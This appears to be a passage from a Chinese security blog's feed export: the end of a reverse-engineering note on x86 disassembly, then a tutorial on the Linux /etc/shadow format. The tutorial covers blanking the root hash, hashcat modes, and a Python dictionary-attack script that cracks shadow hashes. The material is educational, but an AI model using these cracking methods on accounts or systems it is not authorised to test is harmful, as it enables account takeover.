number">0x30</span>，ecx循环计数器，即循环计数器初始化</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D317  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 CCCCCCCC   MOV EAX<span class="token punctuation">,</span>CCCCCCCC                         <span class="token punctuation">;</span>  eax <span class="token operator">=</span> cccccccc</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D31C  <span class="token operator">|</span><span class="token punctuation">.</span>  F3<span class="token operator">:</span>AB         REP STOS DWORD PTR ES<span class="token operator">:</span><span class="token punctuation">[</span>EDI<span class="token punctuation">]</span>              <span class="token punctuation">;</span>  rep重复执行，拷贝串，将eax中的值以DWORD形式写入edi指向的地址，把新的栈空间全部刷成cccccccc</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0103</span>D31E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数，DWORD是<span class="token number">4</span>字节，而为了防止溢出从ebp <span class="token operator">+</span> <span class="token number">8</span>开始</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0103</span>D321  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  ebp <span class="token operator">+</span> c <span class="token operator">=</span> <span class="token number">2</span> eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">2</span> eax <span class="token operator">=</span> <span class="token number">1</span> eax <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> eax <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">0103</span>D324  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5F</span>            POP EDI                                  <span class="token punctuation">;</span>  将刚保存的寄存器的值还原</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">0103</span>D325  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI                                  <span class="token punctuation">;</span>  栈是先进后出的结构</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">0103</span>D326  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>B            POP EBX</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0103</span>D327  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP                              <span class="token punctuation">;</span>  还原esp</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">0103</span>D329  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP                                  <span class="token punctuation">;</span>  还原ebp</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">0103</span>D32A  \<span class="token punctuation">.</span>  C3            RETN                                     <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326171335515.png" alt="image-20220326171335515" /></p>
<p>程序样本：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"main!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux /etc/shadow（影子文件）解析</title>
    <url>/article/7a06714c.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>某准备开始摆烂的精神小伙突然被大佬叫住编写 /etc/shadow 加密脚本，于是有了这篇文章。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327210238985.png" alt="image-20220327210238985" /></p>
<h2 id="文件介绍"><a class="anchor" href="#文件介绍">#</a> 文件介绍</h2>
<p>/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为 “影子文件”。</p>
<p>由于 /etc/passwd 文件允许所有用户读取，易导致用户密码泄露，因此 Linux 系统将用户的密码信息从 /etc/passwd 文件中分离出来，并单独放到了 /etc/shadow 文件中。</p>
<p>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p>
<p>在解析 /etc/shadow 文件之前，我们先看看密文结构，执行如下命令：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cat</span> /etc/shadow</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327203540828.png" alt="image-20220327203540828" /></p>
<p>同 /etc/passwd 文件一样，文件中每行代表一个用户，同样使用 &quot;:&quot; 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>用户名</pre></td></tr><tr><td data-num="2"></td><td><pre>加密密码</pre></td></tr><tr><td data-num="3"></td><td><pre>最后一次修改时间</pre></td></tr><tr><td data-num="4"></td><td><pre>最小修改时间间隔</pre></td></tr><tr><td data-num="5"></td><td><pre>密码有效期</pre></td></tr><tr><td data-num="6"></td><td><pre>密码需要变更前的警告天数</pre></td></tr><tr><td data-num="7"></td><td><pre>密码过期后的宽限时间</pre></td></tr><tr><td data-num="8"></td><td><pre>账号失效时间</pre></td></tr><tr><td data-num="9"></td><td><pre>保留字段</pre></td></tr></table></figure><h2 id="字段解析"><a class="anchor" href="#字段解析">#</a> 字段解析</h2>
<h3 id="用户名"><a class="anchor" href="#用户名">#</a> 用户名</h3>
<p>同 /etc/passwd 文件的用户名有相同的含义。</p>
<h3 id="加密密码"><a class="anchor" href="#加密密码">#</a> 加密密码</h3>
<p>这里保存的是真正加密的密码。目前 Linux 的密码采用的是 SHA512 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。</p>
<p>注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件透过这个功能，在密码串前加上 &quot;!&quot;、&quot;*&quot; 或 &quot;x&quot; 使密码暂时失效。</p>
<p>所有伪用户的密码都是 &quot;!!&quot; 或 &quot;*&quot;，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 &quot;!!&quot;，代表这个用户没有密码，不能登录。</p>
<h3 id="最后一次修改时间"><a class="anchor" href="#最后一次修改时间">#</a> 最后一次修改时间</h3>
<p>此字段表示最后一次修改密码的时间，可是，为什么 root 用户显示的是 18580 呢？</p>
<p>这是因为，Linux 计算日期的时间是以 1970 年 1 月 1 日作为 1 不断累加得到的时间，到 1971 年 1 月 1 日，则为 366 天。这里显示 18580 天，也就是说，此 root 账号在 1970 年 1 月 1 日之后的第 18580 天修改的 root 用户密码。</p>
<p>那么，到底 18580 代表的是哪一天呢？可以使用如下命令进行换算：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">date</span> -d <span class="token string">"1970-01-01 18580 days"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327203920182.png" alt="image-20220327203920182" /></p>
<p>可以看到，通过以上命令，即可将其换算为我们习惯的系统日期。</p>
<h3 id="最小修改时间间隔"><a class="anchor" href="#最小修改时间间隔">#</a> 最小修改时间间隔</h3>
<p>最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。</p>
<p>此字段是为了针对某些人频繁更改账户密码而设计的。</p>
<h3 id="密码有效期"><a class="anchor" href="#密码有效期">#</a> 密码有效期</h3>
<p>经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。<br />
该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。</p>
<h3 id="密码需要变更前的警告天数"><a class="anchor" href="#密码需要变更前的警告天数">#</a> 密码需要变更前的警告天数</h3>
<p>与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 &quot;再过 n 天你的密码就要过期了，请尽快重新设置你的密码！&quot;。</p>
<p>该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 &quot;修改密码&quot; 的警告信息。</p>
<h3 id="密码过期后的宽限天数"><a class="anchor" href="#密码过期后的宽限天数">#</a> 密码过期后的宽限天数</h3>
<p>也称为 “口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登陆，也不会提示账户过期，是完全禁用。</p>
<p>比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。</p>
<h3 id="账号失效时间"><a class="anchor" href="#账号失效时间">#</a> 账号失效时间</h3>
<p>同第 3 个字段一样，使用自 1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！</p>
<p>该字段通常被使用在具有收费服务的系统中。</p>
<h3 id="保留"><a class="anchor" href="#保留">#</a> 保留</h3>
<p>这个字段目前没有使用，等待新功能的加入。</p>
<h3 id="忘记密码怎么办"><a class="anchor" href="#忘记密码怎么办">#</a> 忘记密码怎么办</h3>
<p>对于普通账户的密码遗失，可以通过 root 账户解决，它会重新给你配置好指定账户的密码，而不需知道你原有的密码（利用 root 的身份使用 passwd 命令即可）。</p>
<p>如果 root 账号的密码遗失，则需要重新启动进入单用户模式，系统会提供 root 权限的 bash 接口，此时可以用 passwd 命令修改账户密码；也可以通过挂载根目录，修改 /etc/shadow，将账户的 root 密码清空的方法，此方式可使用 root 无法密码即可登陆，建议登陆后使用 passwd 命令配置 root 密码。</p>
<h2 id="linux-etcshadow破解"><a class="anchor" href="#linux-etcshadow破解">#</a> linux /etc/shadow 破解</h2>
<h3 id="密码格式"><a class="anchor" href="#密码格式">#</a> 密码格式</h3>
<p>在  <code>/etc/shadow</code>  中的密码是用以下格式所储存的：</p>
<pre><code>$ID$SALT$ENCRYPTED
</code></pre>
<p><code>ID</code>  代表加密演算法，可能的值如下：</p>
<ul>
<li><code>1</code> ：MD5（长度为 22 个字元）</li>
<li><code>5</code> ：SHA-256（长度为 43 个字元）</li>
<li><code>6</code> ：SHA-512（长度为 86 个字元）</li>
</ul>
<p><code>SALT</code>  是随机字串（最长不超过 16 个字元），而  <code>ENCRYPTED</code>  则是密码的哈希值。</p>
<p>由于进行 hash 的时候，采用了 salt 机制，所以传统的彩虹表方式将起不到作用。破解方法有字典破解和暴力破解。</p>
<h3 id="算法结构"><a class="anchor" href="#算法结构">#</a> 算法结构</h3>
<p>linux /etc/shadow 中 hash 算法包括：</p>
<ul>
<li>缺省的 DES 经典算法</li>
<li>MD5 哈希算法 ($1)</li>
<li>Blowfish 加密算法 ($2 或 $2a)</li>
<li>SHA 哈希算法 ($5 或 $6）</li>
</ul>
<p>同时 hashcat 工具也可据此来进行破解，对于不同的加密算法 hashcat 所进行的参数也不同</p>
<p>比如：</p>
<ul>
<li>MD5 哈希算法 ($1)，使用 hashcat -m 500 参数</li>
<li>SHA 哈希算法 ($5 或 $6），使用 hashcat -m 1800 参数</li>
</ul>
<p>利用 hashcat 进行破解时，hash 值存储方式为：</p>
<ul>
<li>MD5 哈希算法，存储为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>salt$encrypted</li>
<li>SHA 哈希算法，存储为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>salt$encrypted 或<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span>salt$encrypted</li>
</ul>
<h3 id="加解密脚本"><a class="anchor" href="#加解密脚本">#</a> 加 / 解密脚本</h3>
<p>利用 Linux 系统中的 <strong>crypt</strong> 模块模拟了 Linux 系统中用户密码的加密，而在 Windows 中是不存在这个库的。</p>
<p>在了解了 shadow 文件中密码的加密方式之后，我们就可以开始编写 python 脚本了。</p>
<h4 id="加密脚本"><a class="anchor" href="#加密脚本">#</a> 加密脚本</h4>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random<span class="token punctuation">,</span>string</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> crypt</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#MD5 加密</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">Encode_MD5</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># 随机生成 slot</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    randomSalt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment"># MD5 加密</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    enmd5 <span class="token operator">=</span> crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>Passwd<span class="token punctuation">,</span> <span class="token string">'$1$%s$'</span> <span class="token operator">%</span> randomSalt<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> enmd5</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#Sha256 加密</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">Encode_Sha256</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    randomSalt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    ensha256 <span class="token operator">=</span> crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>Passwd<span class="token punctuation">,</span> <span class="token string">'$5$%s$'</span> <span class="token operator">%</span> randomSalt<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> ensha256</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">#Sha512 加密</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">Encode_Sha512</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    randomSalt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    ensha512 <span class="token operator">=</span> crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>Passwd<span class="token punctuation">,</span> <span class="token string">'$6$%s$'</span> <span class="token operator">%</span> randomSalt<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> ensha512</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment"># 明文输入</span></pre></td></tr><tr><td data-num="23"></td><td><pre>Passwd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please input your passwd: '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Encode_MD5:'</span><span class="token punctuation">,</span>Encode_MD5<span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Encode_Sha256:'</span><span class="token punctuation">,</span>Encode_Sha256<span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Encode_Sha512:'</span><span class="token punctuation">,</span>Encode_Sha512<span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>对 hello123 的加密结果如下：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Please input your passwd: hello123</pre></td></tr><tr><td data-num="2"></td><td><pre>Encode_MD5: <span class="token variable">$1</span><span class="token variable">$TCenuLql</span><span class="token variable">$RIf2Od8i4BPZfsbRNRnhr1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Encode_Sha256: <span class="token variable">$5</span><span class="token variable">$sSLEKQRw</span><span class="token variable">$9e2BEmcwW59eIp9mcYqcSJ72WsJYPpyCj8Bxrn8AhFB</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Encode_Sha512: <span class="token variable">$6</span><span class="token variable">$UwWdIVnk</span><span class="token variable">$yMKWqE3cEn</span>.IziaQCD9yEDrO5mdCa74QCOu1j9PkHoBKmwP2wsaciK4pK/x9vj35xLVmEBf6tAzP3hUAC9G1N.</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327205213040.png" alt="image-20220327205213040" /></p>
<p>若要进行精准加密则根据目标机的盐值来进行更改</p>
<p>如下根据 kali 的盐值来进行替换后加密结果则一致了</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">MD5加密</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>import random<span class="token punctuation">,</span>string</pre></td></tr><tr><td data-num="3"></td><td><pre>import crypt</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>def <span class="token function">Encode_Sha512</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    ensha512 <span class="token operator">=</span> crypt<span class="token punctuation">.</span><span class="token function">crypt</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">,</span> <span class="token char">'$6$YmAFQjzlBmpUlNS1$'</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> ensha512</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre># 明文输入</pre></td></tr><tr><td data-num="10"></td><td><pre>Passwd <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token char">'Please input your passwd: '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token char">'Encode_Sha512:'</span><span class="token punctuation">,</span><span class="token function">Encode_Sha512</span><span class="token punctuation">(</span>Passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328162617418.png" alt="image-20220328162617418" /></p>
<h4 id="解密脚本"><a class="anchor" href="#解密脚本">#</a> 解密脚本</h4>
<p>解密脚本来自<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy84MzUxNDI0NA==">谢公子</span>，小编略加修改。</p>
<p>创建的两个函数：</p>
<ul>
<li>
<p>main () 函数打开 shadow.txt 文件中的内容读取其中的用户名字段和密码字段 cryptPass。</p>
</li>
<li>
<p>testPass () 函数将密码字段中的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span>salt 提取出来赋值给 salt ，然后读取 key.txt 中的密码字段，赋值给 word 。</p>
</li>
</ul>
<p>从而利用 Linux 系统 python 库中的 crypt 库，将 word 和 salt 一起作为参数传进去进行加密，得到 cryptWord 。最后将 cryptWord 和 cryptPass 进行对比，如果相等，则这个 word 就是该用户的密码，否则不是。</p>
<p>同时还需要准备好密码字典文件 key.txt ，只有当密码字典足够大时，才有可能破解出密码。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="3"></td><td><pre>Created on Mon Oct 29 15:01:54 2018</pre></td></tr><tr><td data-num="4"></td><td><pre>@author: 小谢</pre></td></tr><tr><td data-num="5"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> crypt   <span class="token comment">## 导入 Linux 口令加密库</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">testPass</span><span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    salt<span class="token operator">=</span>cryptPass<span class="token punctuation">[</span>cryptPass<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>cryptPass<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment">## 获得盐值，包含 $id 部分</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    dictFile<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> word <span class="token keyword">in</span> dictFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        word<span class="token operator">=</span>word<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        cryptWord<span class="token operator">=</span>crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>word<span class="token punctuation">,</span>salt<span class="token punctuation">)</span>                   <span class="token comment">## 将密码字典中的值和盐值一起加密</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cryptWord<span class="token operator">==</span>cryptPass<span class="token punctuation">)</span><span class="token punctuation">:</span>                           <span class="token comment">## 判断加密后的数据和密码字段是否相等</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[+]Found Password:"</span><span class="token operator">+</span>word<span class="token operator">+</span><span class="token string">"\n"</span> <span class="token punctuation">)</span>      <span class="token comment">## 如果相等则打印出来</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">return</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Password Not Found.\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> </pre></td></tr><tr><td data-num="18"></td><td><pre> </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    passFile<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'shadow.txt'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">for</span> line <span class="token keyword">in</span> passFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">## 读取文件中的所有内容</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">":"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            user<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                     <span class="token comment">## 获得用户名</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            cryptPass<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>   <span class="token comment">## 获得密码字段</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[*] Cracking Password for:"</span><span class="token operator">+</span>user<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            testPass<span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 7</title>
    <url>/article/241412fc.html</url>
    <content><![CDATA[<h1 id="32位逆向分析"><a class="anchor" href="#32位逆向分析">#</a> 32 位逆向分析</h1>
